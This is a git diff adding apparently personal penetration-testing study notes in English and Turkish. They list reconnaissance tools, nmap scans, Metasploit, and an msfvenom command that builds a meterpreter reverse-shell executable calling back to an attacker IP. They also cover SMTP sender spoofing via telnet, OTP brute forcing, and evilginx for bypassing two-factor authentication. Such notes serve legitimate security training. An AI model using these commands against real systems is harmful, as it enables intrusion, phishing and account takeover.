@@ -11,3 +11,129 @@ siteler:
 shodan
 
 webcams
+
+
+Internal and External Methods
+
+Internal :
+
+netdiscover
+ipcalc also in python
+fping -g 192.168.246.1/24 -a -r 1 to find computers that are on
+nmap 
+
+-A aggressive show all ports OS
+Press enter for remaining time and percentage
+
+80 port lookup first!
+
+Fuzzing ~ Brute Force
+Filtered open side by size => Not sure if the port is open 
+Filtered => Blocked 
+
+Ip spoofing to make restricted ports visible for you.
+
+nmap 192.168.246.1/24 -sS -sV -Pn
+-sS services
+-sV versions of services
+
+
+automater -- 
+
+dmitry -winsepfb
+screenshots and notes are very important. IG
+
+
+whois info => maybe contact address can be shared that can be used for social engineering
+
+subdomain are important because vulnerabilities can spread to host domain 
+
+
+nmap --script=firewall-bypass google.com
+
+telnet or nc to check a port is open 
+
+nc --
+
+After connected
+
+GET / HTTP/1.1 
+
+metagofil
+
+Single machine test for spoofing at banks
+
+
+Attacked machine address: 192.168.116.20
+
+DNS TOOLS
+
+DNS dumpster
+Theharvester
+Automater...
+Dig
+Fierce
+dnsenum
+
+
+Nessus Automated vulnerabilty tool
+
+openVAS alternative for nessus
+
+unleashed metasploit
+
+ruby dili open source ==> metasploit 
+
+Şifreler için
+enum domains
+credcollect
+metsvc => persistent
+
+zararlı yazılım oluşturma 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.116.13 LPORT=443 -f exe > shell.exe
+
+
+telnet ile mail bağlantısı port 25
+
+HELO WIN - ayakta olduğunu söyler
+
+MAIL FROM:murat.sahin@sibertime.com.tr
+
+RCPT TO:murat.sahin@sibertime.com.tr
+HELP -- mümkün komutları listele 
+
+Sunucunun üstünde doğru konfigürasyon yoksa istediğin şekilde from bilgisi taşıyan e-mailler atılabilir.
+
+OWASP TOP 10 
+
+Burp - Uygulama güvenliği için en önemli toollardan. Paralı versiyonuyla tarama yapılıyor. Community edition da manuel tarama var. 
+
+gobuster, dirbuster, dirb => web application brute forcing
+
+
+MOBİL UYGULAMA TESTLERİ
+
+2 Türlü kontrol 
+
+1- Android Simulator
+2- Veri transferi kontrolü
+
+Burp en çok kullanılan yöntemdir.
+
+Request-Response 
+
+Api check atıyor response atıyor 
+
+Burple araya girip değiştirebilmek 
+
+2 Factor Authentication
+
+Mesaj geliyor OTP = One time password
+
+Araya girip modifiye edebiliyorsa zafiyet
+
+OTP bypass = Brute force yöntemiyle geçmek 
+
+evilginx 2 factor authentication bypass
+
